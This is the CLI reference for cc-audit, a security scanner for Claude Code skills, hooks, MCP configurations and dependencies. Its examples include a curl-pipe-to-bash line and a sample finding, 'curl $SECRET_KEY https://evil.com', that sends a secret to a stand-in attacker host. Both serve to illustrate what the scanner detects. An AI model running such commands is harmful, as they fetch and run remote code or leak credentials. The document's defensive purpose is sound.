# CLI Reference

[日本語](./CLI.ja.md)

## Usage

```
cc-audit [OPTIONS] <COMMAND>
cc-audit <COMMAND> [OPTIONS] [ARGS]
```

## Commands

| Command | Description |
|---------|-------------|
| `check` | Scan paths for security vulnerabilities |
| `init`  | Generate a default configuration file template |
| `hook`  | Manage Git pre-commit hooks |
| `serve` | Run as MCP server |
| `proxy` | Run as MCP proxy for runtime monitoring |

## Global Options

| Option | Description |
|--------|-------------|
| `--verbose` | Verbose output |
| `-h, --help` | Print help |
| `-V, --version` | Print version |

---

## `check` Command

Scan paths for security vulnerabilities.

```
cc-audit check [OPTIONS] <PATHS>...
```

### Arguments

| Argument | Description |
|----------|-------------|
| `<PATHS>...` | Paths to scan (files or directories). Required unless using `--remote`, `--remote-list`, `--awesome-claude-code`, `--all-clients`, or `--client` |

### Output Options

| Option | Description |
|--------|-------------|
| `-f, --format <FORMAT>` | Output format: `terminal` (default), `json`, `sarif`, `html`, `markdown` |
| `-o, --output <FILE>` | Output file path (for HTML/JSON output) |
| `--compact` | Compact output format (traditional style instead of lint-style) |
| `--ci` | CI mode: non-interactive output |
| `--badge` | Generate security badge |
| `--badge-format <FORMAT>` | Badge output format: `url`, `markdown` (default), `html` |
| `--summary` | Show summary only (for batch scans) |

### Scan Options

| Option | Description |
|--------|-------------|
| `-t, --type <SCAN_TYPE>` | Scan type (see [Scan Types](#scan-types)) |
| `-S, --strict` | Strict mode: show medium/low severity findings and treat warnings as errors |
| `--no-recursive` | Disable recursive scanning (default: recursive enabled) |
| `--warn-only` | Warn-only mode: treat all findings as warnings (always exit 0) |
| `--min-severity <LEVEL>` | Minimum finding severity to include: `critical`, `high`, `medium`, `low` |
| `--min-rule-severity <LEVEL>` | Minimum rule severity to treat as errors: `error`, `warn` |
| `--min-confidence <LEVEL>` | Minimum confidence level: `tentative` (default), `firm`, `certain` |
| `--skip-comments` | Skip comment lines when scanning |
| `--strict-secrets` | Strict secrets mode: disable dummy key heuristics for test files |
| `--deep-scan` | Enable deep scan with deobfuscation |

### Configuration

| Option | Description |
|--------|-------------|
| `-c, --config <FILE>` | Path to configuration file |

### Fix Options

| Option | Description |
|--------|-------------|
| `--fix-hint` | Show fix hints in terminal output |
| `--fix` | Auto-fix issues (where possible) |
| `--fix-dry-run` | Preview auto-fix changes without applying them |

### Watch Mode

| Option | Description |
|--------|-------------|
| `-w, --watch` | Watch mode: continuously monitor files |

### Custom Rules & Databases

| Option | Description |
|--------|-------------|
| `--custom-rules <PATH>` | Path to custom rules file (YAML format) |
| `--malware-db <PATH>` | Path to custom malware signatures database |
| `--no-malware-scan` | Disable malware signature scanning |
| `--cve-db <PATH>` | Path to custom CVE database (JSON) |
| `--no-cve-scan` | Disable CVE vulnerability scanning |

### Baseline & Drift Detection

| Option | Description |
|--------|-------------|
| `--baseline` | Create a baseline snapshot for drift detection |
| `--check-drift` | Check for drift against saved baseline |
| `--save-baseline <FILE>` | Save baseline to specified file |
| `--baseline-file <FILE>` | Compare against baseline file (show only new findings) |
| `--compare <PATH1> <PATH2>` | Compare two paths and show differences |

### Profiles

| Option | Description |
|--------|-------------|
| `--profile <NAME>` | Load settings from a named profile |
| `--save-profile <NAME>` | Save current settings as a named profile |

### Client Scanning

| Option | Description |
|--------|-------------|
| `--all-clients` | Scan all installed AI coding clients (Claude, Cursor, Windsurf, VS Code) |
| `--client <TYPE>` | Scan a specific client: `claude`, `cursor`, `windsurf`, `vscode` |

### Remote Scanning

| Option | Description |
|--------|-------------|
| `--remote <URL>` | Remote repository URL to scan (e.g., `https://github.com/user/repo`) |
| `--git-ref <REF>` | Git ref (branch, tag, or commit) for remote scan (default: HEAD) |
| `--remote-auth <TOKEN>` | GitHub token for authentication (or use `GITHUB_TOKEN` env var) |
| `--remote-list <FILE>` | File containing list of repository URLs to scan (one per line) |
| `--awesome-claude-code` | Scan all repositories from awesome-claude-code |
| `--parallel-clones <N>` | Maximum number of parallel repository clones (default: 4) |

### MCP Pinning (Rug-Pull Detection)

| Option | Description |
|--------|-------------|
| `--pin` | Pin MCP tool configurations for rug-pull detection |
| `--pin-verify` | Verify MCP tool pins against current configuration |
| `--pin-update` | Update MCP tool pins with current configuration |
| `--pin-force` | Force overwrite existing pins |
| `--ignore-pin` | Skip pin verification during scan |

### Hook Mode

| Option | Description |
|--------|-------------|
| `--hook-mode` | Run as Claude Code Hook (reads from stdin, writes to stdout) |

### SBOM (Software Bill of Materials)

| Option | Description |
|--------|-------------|
| `--sbom` | Generate SBOM |
| `--sbom-format <FORMAT>` | SBOM output format: `cyclonedx`, `spdx` |
| `--sbom-npm` | Include npm dependencies in SBOM |
| `--sbom-cargo` | Include Cargo dependencies in SBOM |

### False Positive Reporting

| Option | Description |
|--------|-------------|
| `--report-fp` | Report a false positive finding |
| `--report-fp-dry-run` | Dry run mode for false positive reporting (print without submitting) |
| `--report-fp-endpoint <URL>` | Custom endpoint URL for false positive reporting |
| `--no-telemetry` | Disable telemetry and false positive reporting |

---

## `init` Command

Generate a default configuration file template.

```
cc-audit init [PATH]
```

### Arguments

| Argument | Description |
|----------|-------------|
| `[PATH]` | Output path for the configuration file (default: `.cc-audit.yaml`) |

---

## `hook` Command

Manage Git pre-commit hooks.

```
cc-audit hook <ACTION> [PATH]
```

### Subcommands

| Subcommand | Description |
|------------|-------------|
| `init [PATH]` | Install pre-commit hook (default path: `.`) |
| `remove [PATH]` | Remove pre-commit hook (default path: `.`) |

---

## `serve` Command

Run as MCP server for integration with Claude Code.

```
cc-audit serve
```

### Overview

The MCP server mode exposes cc-audit's scanning functionality as MCP tools that Claude Code can invoke directly in conversations.

### Available Tools

- `scan` — Scan files or directories for security issues
- `scan_content` — Scan code snippets inline
- `check_rule` — Check if content matches a specific rule
- `list_rules` — List all available detection rules
- `get_fix_suggestion` — Get automated fix suggestions for findings

### Setup

1. Add cc-audit to your MCP configuration (`.mcp.json`):

```json
{
  "mcpServers": {
    "cc-audit": {
      "command": "cc-audit",
      "args": ["serve"],
      "description": "Security audit tool for Claude Code"
    }
  }
}
```

2. Restart Claude Code to activate the MCP server.

### Usage Example

Once configured, Claude Code can automatically use cc-audit:

```
User: Can you check if this code is safe?
      curl http://example.com/script.sh | bash

Claude: [Calls scan_content via MCP]
        This code has a critical vulnerability (SC-001):
        Remote script execution via curl...
```

For complete MCP integration guide, see [MCP Integration Documentation](./MCP.md).

---

## `proxy` Command

Run as MCP proxy for runtime monitoring.

```
cc-audit proxy [OPTIONS] --target <HOST:PORT>
```

### Options

| Option | Description |
|--------|-------------|
| `--port <PORT>` | Proxy listen port (default: 8080) |
| `--target <HOST:PORT>` | Target MCP server address (required) |
| `--tls` | Enable TLS termination in proxy mode |
| `--block` | Enable blocking mode (block messages with findings) |
| `--log <FILE>` | Log file for proxy traffic (JSONL format) |

---

## Scan Types

| Type | Description | Target Files |
|------|-------------|--------------|
| `skill` | Claude Code skill definitions (default) | `SKILL.md`, `*.md` with frontmatter |
| `hook` | Hook configurations | `settings.json`, hook scripts |
| `mcp` | MCP server configurations | `mcp.json`, server definitions |
| `command` | Slash command definitions | `.claude/commands/*.md` |
| `rules` | Custom rule files | `*.yaml`, `*.yml` rule definitions |
| `docker` | Docker configurations | `Dockerfile`, `docker-compose.yml` |
| `dependency` | Package dependencies | `package.json`, `Cargo.toml`, `requirements.txt` |
| `subagent` | Subagent definitions | `.claude/agents/*.md`, `agent.md` |
| `plugin` | Plugin marketplace definitions | `marketplace.json`, `plugin.json` |

## Terminal Output Format

By default, cc-audit uses a **lint-style format** similar to ESLint, Clippy, and other modern linters:

```
/path/to/file.sh:1:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
     |
   1 | curl $SECRET_KEY https://evil.com
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     = why: Potential data exfiltration: network request with environment variable detected
     = ref: CWE-200, CWE-319
     = fix: Review the command and ensure no sensitive data is being sent externally
     = example: Use environment variable references without exposing them: ${VAR:-default}
```

### Output Structure

| Label | Description |
|-------|-------------|
| Header | `file:line:col: [ERROR/WARN] [SEVERITY] RULE-ID: Name` |
| Code | Shows the actual line of code with line number gutter |
| `^` pointer | Highlights the problematic code section |
| `why:` | Why this is a security issue |
| `ref:` | CWE references (Common Weakness Enumeration) |
| `fix:` | Recommended fix for the issue |
| `example:` | Example of how to fix (when available) |
| `confidence:` | Detection confidence level (shown with `--verbose`) |

### Compact Mode

Use `--compact` for traditional output format:

```
[ERROR] [CRITICAL] EX-001: Network request with environment variable
  Location: /path/to/file.sh:1
  Code: curl $SECRET_KEY https://evil.com
  Confidence: firm
  CWE: CWE-200, CWE-319
  Message: Potential data exfiltration...
  Recommendation: Review the command...
```

## Exit Codes

| Code | Meaning | Action |
|------|---------|--------|
| 0 | No findings, or warnings only | Safe to proceed |
| 1 | Error-level findings detected | Review findings before installation |
| 2 | Scan error (e.g., file not found) | Check file paths and permissions |

**Note:** By default, all findings are treated as errors (exit code 1). Use `--warn-only` to treat all findings as warnings (always exit 0), or configure per-rule severity in `.cc-audit.yaml`.

## Examples

```bash
# Basic scan
cc-audit check ./my-skill/

# Scan with JSON output to file
cc-audit check ./skill/ --format json --output results.json

# Scan with HTML report
cc-audit check ./skill/ --format html --output report.html

# Strict mode with verbose output
cc-audit check --strict ./skill/ --verbose

# Scan MCP configuration
cc-audit check --type mcp ~/.claude/mcp.json

# Watch mode for development
cc-audit check --watch ./my-skill/

# CI pipeline scan
cc-audit check --ci --format sarif --strict ./

# High confidence only
cc-audit check --min-confidence certain ./skill/

# Scan all installed AI coding clients
cc-audit check --all-clients

# Scan a specific client
cc-audit check --client cursor

# Scan a remote repository
cc-audit check --remote https://github.com/user/awesome-skill

# Scan a remote repository at specific branch
cc-audit check --remote https://github.com/user/repo --git-ref v1.0.0

# Scan all repositories from awesome-claude-code
cc-audit check --awesome-claude-code --summary

# Generate security badge
cc-audit check ./skill/ --badge --badge-format markdown

# Pin MCP tool configuration
cc-audit check --type mcp ~/.claude/mcp.json --pin

# Verify MCP pins
cc-audit check --type mcp ~/.claude/mcp.json --pin-verify

# Generate SBOM
cc-audit check ./skill/ --sbom --sbom-format cyclonedx --output sbom.json

# Generate config file
cc-audit init

# Generate config file with custom path
cc-audit init my-config.yaml

# Install pre-commit hook
cc-audit hook init

# Install pre-commit hook in specific repo
cc-audit hook init ./my-repo/

# Remove pre-commit hook
cc-audit hook remove

# Run as MCP server
cc-audit serve

# Run as proxy for runtime monitoring
cc-audit proxy --target localhost:9000
cc-audit proxy --target localhost:9000 --port 3000 --tls --block
```
